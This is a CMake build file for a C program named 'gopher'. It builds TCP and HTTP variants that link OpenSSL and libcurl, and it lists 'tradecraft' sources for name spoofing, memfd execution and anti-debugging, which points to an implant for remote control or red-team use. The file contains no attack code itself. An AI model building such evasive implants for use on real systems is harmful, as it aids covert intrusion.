cmake_minimum_required(VERSION 3.15)
project(gopher C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

add_compile_options(-Wall -Wextra -O2 -D_GNU_SOURCE)

include_directories(include lib/mpack lib/miniz)

find_package(OpenSSL REQUIRED)
find_package(CURL REQUIRED)

set(COMMON_SOURCES
    src/net.c
    src/crypt.c
    src/pack.c
    src/os_info.c
    src/tasks.c
    src/tradecraft/spoof_name.c
    src/tradecraft/memfd_exec.c
    src/tradecraft/anti_debug.c
    lib/mpack/mpack.c
    lib/miniz/miniz.c
)

set(COMMON_LIBS OpenSSL::Crypto pthread util)

add_executable(gopher-tcp ${COMMON_SOURCES} src/main_tcp.c)
target_link_libraries(gopher-tcp ${COMMON_LIBS})

add_executable(gopher-http ${COMMON_SOURCES} src/main_http.c src/net_http.c)
target_link_libraries(gopher-http ${COMMON_LIBS} CURL::libcurl)

add_executable(gopher-http-debug ${COMMON_SOURCES} src/main_http.c src/net_http.c)
target_compile_definitions(gopher-http-debug PRIVATE DEBUG)
target_compile_options(gopher-http-debug PRIVATE -O0 -g)
target_link_libraries(gopher-http-debug ${COMMON_LIBS} CURL::libcurl)
